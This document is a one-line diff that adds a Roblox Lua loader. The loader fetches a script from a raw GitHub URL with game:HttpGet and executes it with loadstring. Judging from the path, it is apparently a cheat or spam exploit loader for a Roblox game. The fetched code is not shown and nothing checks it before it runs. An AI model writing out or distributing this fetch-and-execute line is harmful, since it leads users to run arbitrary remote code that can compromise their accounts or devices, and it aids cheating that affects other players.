@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/upd-my-anime-mine-spam5-ppdxhynfo8db1e.lua"))()
